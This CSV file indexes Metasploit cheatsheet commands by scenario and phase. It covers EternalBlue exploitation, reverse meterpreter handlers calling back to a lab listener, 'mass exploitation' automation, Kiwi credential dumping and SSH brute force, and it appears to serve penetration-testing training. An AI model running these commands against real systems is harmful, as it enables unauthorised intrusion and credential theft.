"cheatsheet_id","command_id","context","scenario_title","section_title","example","shows"
"metasploit-post-exploit","meterpreter-kiwi-creds-all","section","","Phase 6: Post-Exploitation Documentation and Cleanup","creds_all","Credentials table with Username, Domain, NTLM, SHA1"
"metasploit-post-exploit","meterpreter-upload","section","","Phase 6: Post-Exploitation Documentation and Cleanup","upload /usr/bin/unix-privesc-check C:\Temp\privesc.exe","Uploading: <file>"
"metasploit-automation","msf-use-module","scenario","Scenario 1: Resource Script for Automated Exploitation Workflow","","",""
"metasploit-automation","msf-set-payload","scenario","Scenario 1: Resource Script for Automated Exploitation Workflow","","",""
"metasploit-automation","msf-set-lhost","scenario","Scenario 1: Resource Script for Automated Exploitation Workflow","","",""
"metasploit-automation","msf-set-lport","scenario","Scenario 1: Resource Script for Automated Exploitation Workflow","","",""
"metasploit-automation","msf-exploit-run","scenario","Scenario 1: Resource Script for Automated Exploitation Workflow","","",""
"metasploit-automation","msf-sessions-list","scenario","Scenario 1: Resource Script for Automated Exploitation Workflow","","",""
"metasploit-automation","msf-jobs-list","scenario","Scenario 1: Resource Script for Automated Exploitation Workflow","","",""
"metasploit-automation","msf-handler-autorunscript","scenario","Scenario 2: AutoRunScript for Automatic Post-Exploitation","","",""
"metasploit-automation","msf-handler-setup","scenario","Scenario 2: AutoRunScript for Automatic Post-Exploitation","","",""
"metasploit-automation","msf-handler-exitonsession","scenario","Scenario 2: AutoRunScript for Automatic Post-Exploitation","","",""
"metasploit-automation","msf-db-import","scenario","Scenario 3: Mass Exploitation with Database Queries and Looping","","",""
"metasploit-automation","msf-services-filter-port","scenario","Scenario 3: Mass Exploitation with Database Queries and Looping","","",""
"metasploit-automation","msf-hosts-list","scenario","Scenario 3: Mass Exploitation with Database Queries and Looping","","",""
"metasploit-automation","msf-use-module","scenario","Scenario 3: Mass Exploitation with Database Queries and Looping","","",""
"metasploit-automation","msf-set-option","scenario","Scenario 3: Mass Exploitation with Database Queries and Looping","","",""
"metasploit-automation","msf-exploit-run","scenario","Scenario 3: Mass Exploitation with Database Queries and Looping","","",""
"metasploit-automation","msf-sessions-list","scenario","Scenario 3: Mass Exploitation with Database Queries and Looping","","",""
"metasploit-automation","msf-jobs-list","scenario","Scenario 3: Mass Exploitation with Database Queries and Looping","","",""
"metasploit-automation","msf-db-export","scenario","Scenario 3: Mass Exploitation with Database Queries and Looping","","",""
"metasploit-automation","msf-use-module","section","","Phase 1: Resource Script Creation (Capture Successful Workflow)","use exploit/multi/handler","Prompt changes to show module type and path"
"metasploit-automation","msf-set-option","section","","Phase 1: Resource Script Creation (Capture Successful Workflow)","set RHOSTS 192.168.45.100","OPTION => VALUE confirmation message"
"metasploit-automation","msf-exploit-run","section","","Phase 1: Resource Script Creation (Capture Successful Workflow)","exploit","Started reverse TCP handler"
"metasploit-automation","msf-handler-autorunscript","section","","Phase 2: AutoRunScript Configuration (Automatic Post-Exploitation)","use exploit/multi/handler; set payload windows/meterpreter_reverse_https; set LHOST 192.168.45.5; set LPORT 443; set AutoRunScript post/windows/manage/migrate; run -j","AutoRunScript set"
"metasploit-automation","msf-handler-setup","section","","Phase 2: AutoRunScript Configuration (Automatic Post-Exploitation)","use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run","Started reverse TCP handler on <LHOST>:<LPORT>"
"metasploit-automation","msf-handler-exitonsession","section","","Phase 2: AutoRunScript Configuration (Automatic Post-Exploitation)","use exploit/multi/handler; set payload windows/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; set ExitOnSession false; run -j","ExitOnSession => false"
"metasploit-automation","msf-db-import","section","","Phase 3: Database-Driven Targeting (Mass Exploitation Setup)","db_import /home/kali/scans/network.xml","Importing data..."
"metasploit-automation","msf-services-filter-port","section","","Phase 3: Database-Driven Targeting (Mass Exploitation Setup)","","See command documentation"
"metasploit-automation","msf-hosts-list","section","","Phase 3: Database-Driven Targeting (Mass Exploitation Setup)","","See command documentation"
"metasploit-automation","msf-set-option","section","","Phase 3: Database-Driven Targeting (Mass Exploitation Setup)","set RHOSTS 192.168.45.100","OPTION => VALUE confirmation message"
"metasploit-automation","msf-exploit-run","section","","Phase 4: Parallel Execution and Monitoring","exploit","Started reverse TCP handler"
"metasploit-automation","msf-jobs-list","section","","Phase 4: Parallel Execution and Monitoring","jobs","Jobs table with ID, Name, Payload, Payload opts"
"metasploit-automation","msf-sessions-list","section","","Phase 4: Parallel Execution and Monitoring","sessions -l","Active sessions table with ID, Name, Type, Information, C..."
"metasploit-automation","msf-sessions-list","section","","Phase 5: Results Collection and Documentation","sessions -l","Active sessions table with ID, Name, Type, Information, C..."
"metasploit-automation","msf-db-export","section","","Phase 5: Results Collection and Documentation","","See command documentation"
"metasploit-automation","msf-jobs-list","section","","Phase 5: Results Collection and Documentation","jobs","Jobs table with ID, Name, Payload, Payload opts"
"metasploit-exploitation","msf-aux-smb-ms17010","scenario","Scenario 1: Basic Exploitation Workflow - SMB MS17-010 (EternalBlue)","","",""
"metasploit-exploitation","msf-use-module","scenario","Scenario 1: Basic Exploitation Workflow - SMB MS17-010 (EternalBlue)","","",""
"metasploit-exploitation","msf-show-options","scenario","Scenario 1: Basic Exploitation Workflow - SMB MS17-010 (EternalBlue)","","",""
"metasploit-exploitation","msf-show-payloads","scenario","Scenario 1: Basic Exploitation Workflow - SMB MS17-010 (EternalBlue)","","",""
"metasploit-exploitation","msf-set-payload","scenario","Scenario 1: Basic Exploitation Workflow - SMB MS17-010 (EternalBlue)","","",""
"metasploit-exploitation","msf-set-lhost","scenario","Scenario 1: Basic Exploitation Workflow - SMB MS17-010 (EternalBlue)","","",""
"metasploit-exploitation","msf-set-lport","scenario","Scenario 1: Basic Exploitation Workflow - SMB MS17-010 (EternalBlue)","","",""
"metasploit-exploitation","msf-exploit-check","scenario","Scenario 1: Basic Exploitation Workflow - SMB MS17-010 (EternalBlue)","","",""
"metasploit-exploitation","msf-exploit-run","scenario","Scenario 1: Basic Exploitation Workflow - SMB MS17-010 (EternalBlue)","","",""
"metasploit-exploitation","msf-handler-background","scenario","Scenario 2: Multi-Target Exploitation with Background Handlers","","",""
"metasploit-exploitation","msf-handler-exitonsession","scenario","Scenario 2: Multi-Target Exploitation with Background Handlers","","",""
"metasploit-exploitation","msf-jobs-list","scenario","Scenario 2: Multi-Target Exploitation with Background Handlers","","",""
"metasploit-exploitation","msf-sessions-list","scenario","Scenario 2: Multi-Target Exploitation with Background Handlers","","",""
"metasploit-exploitation","msf-session-interact","scenario","Scenario 2: Multi-Target Exploitation with Background Handlers","","",""
"metasploit-exploitation","msf-session-background","scenario","Scenario 2: Multi-Target Exploitation with Background Handlers","","",""
"metasploit-exploitation","msf-use-module","scenario","Scenario 3: Payload Selection and Troubleshooting","","",""
"metasploit-exploitation","msf-show-payloads","scenario","Scenario 3: Payload Selection and Troubleshooting","","",""
"metasploit-exploitation","msf-show-options","scenario","Scenario 3: Payload Selection and Troubleshooting","","",""
"metasploit-exploitation","msf-exploit-run","scenario","Scenario 3: Payload Selection and Troubleshooting","","",""
"metasploit-exploitation","msf-info-module","scenario","Scenario 3: Payload Selection and Troubleshooting","","",""
"metasploit-exploitation","msf-show-targets","scenario","Scenario 3: Payload Selection and Troubleshooting","","",""
"metasploit-exploitation","msf-set-target","scenario","Scenario 3: Payload Selection and Troubleshooting","","",""
"metasploit-exploitation","msf-handler-setup","scenario","Scenario 4: Session Upgrade and Management","","",""
"metasploit-exploitation","msf-session-upgrade-shell","scenario","Scenario 4: Session Upgrade and Management","","",""
"metasploit-exploitation","msf-sessions-list","scenario","Scenario 4: Session Upgrade and Management","","",""
"metasploit-exploitation","msf-session-interact","scenario","Scenario 4: Session Upgrade and Management","","",""
"metasploit-exploitation","msf-session-kill","scenario","Scenario 4: Session Upgrade and Management","","",""
"metasploit-exploitation","msf-search-keyword","section","","Phase 1: Exploit Selection and Verification","","See command documentation"
"metasploit-exploitation","msf-search-cve","section","","Phase 1: Exploit Selection and Verification","","See command documentation"
"metasploit-exploitation","msf-use-module","section","","Phase 1: Exploit Selection and Verification","use exploit/multi/handler","Prompt changes to show module type and path"
"metasploit-exploitation","msf-info-module","section","","Phase 1: Exploit Selection and Verification","info exploit/windows/smb/ms17_010_eternalblue","Module details displayed (Name, Module, License, Rank, etc)"
"metasploit-exploitation","msf-exploit-check","section","","Phase 1: Exploit Selection and Verification","check","The target is vulnerable"
"metasploit-exploitation","msf-show-payloads","section","","Phase 2: Payload Configuration","show payloads","Compatible Payloads list with name, rank, description"
"metasploit-exploitation","msf-set-payload","section","","Phase 2: Payload Configuration","set payload windows/x64/meterpreter/reverse_tcp","payload => <path> confirmation"
"metasploit-exploitation","msf-set-lhost","section","","Phase 2: Payload Configuration","set LHOST 192.168.45.5","LHOST => <IP> confirmation"
"metasploit-exploitation","msf-set-lport","section","","Phase 2: Payload Configuration","set LPORT 443","LPORT => <PORT> confirmation"
"metasploit-exploitation","msf-show-options","section","","Phase 2: Payload Configuration","show options","Options table displayed with columns: Name, Current Setti..."
"metasploit-exploitation","msf-set-option","section","","Phase 3: Exploitation Execution","set RHOSTS 192.168.45.100","OPTION => VALUE confirmation message"
"metasploit-exploitation","msf-show-targets","section","","Phase 3: Exploitation Execution","show targets","Available targets list with ID and name"
"metasploit-exploitation","msf-set-target","section","","Phase 3: Exploitation Execution","set target 1","target => <ID> confirmation"
"metasploit-exploitation","msf-exploit-run","section","","Phase 3: Exploitation Execution","exploit","Started reverse TCP handler"
"metasploit-exploitation","msf-handler-setup","section","","Phase 4: Handler Setup for Multi-Target Operations","use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run","Started reverse TCP handler on <LHOST>:<LPORT>"
"metasploit-exploitation","msf-handler-background","section","","Phase 4: Handler Setup for Multi-Target Operations","use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run -j","Exploit running as background job <ID>"
"metasploit-exploitation","msf-handler-exitonsession","section","","Phase 4: Handler Setup for Multi-Target Operations","use exploit/multi/handler; set payload windows/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; set ExitOnSession false; run -j","ExitOnSession => false"
"metasploit-exploitation","msf-jobs-list","section","","Phase 4: Handler Setup for Multi-Target Operations","jobs","Jobs table with ID, Name, Payload, Payload opts"
"metasploit-exploitation","msf-sessions-list","section","","Phase 5: Session Management and Upgrade","sessions -l","Active sessions table with ID, Name, Type, Information, C..."
"metasploit-exploitation","msf-session-interact","section","","Phase 5: Session Management and Upgrade","sessions -i 1","Starting interaction with <ID>"
"metasploit-exploitation","msf-session-upgrade-shell","section","","Phase 5: Session Management and Upgrade","sessions -u 1","Meterpreter session opened"
"metasploit-exploitation","msf-session-background","section","","Phase 5: Session Management and Upgrade","background","Backgrounding session <ID>"
"metasploit-exploitation","msf-session-kill","section","","Phase 5: Session Management and Upgrade","sessions -k 1","Session <ID> closed"
"metasploit-scanning","msf-workspace-add","scenario","Scenario 1: SMB Enumeration Without Credentials","","",""
"metasploit-scanning","msf-db-import","scenario","Scenario 1: SMB Enumeration Without Credentials","","",""
"metasploit-scanning","msf-aux-smb-version","scenario","Scenario 1: SMB Enumeration Without Credentials","","",""
"metasploit-scanning","msf-aux-smb-shares","scenario","Scenario 1: SMB Enumeration Without Credentials","","",""
"metasploit-scanning","msf-aux-smb-users","scenario","Scenario 1: SMB Enumeration Without Credentials","","",""
"metasploit-scanning","msf-aux-smb-ms17010","scenario","Scenario 1: SMB Enumeration Without Credentials","","",""
"metasploit-scanning","msf-aux-ssh-login","scenario","Scenario 2: Multi-Service Brute Force with Credential Reuse","","",""
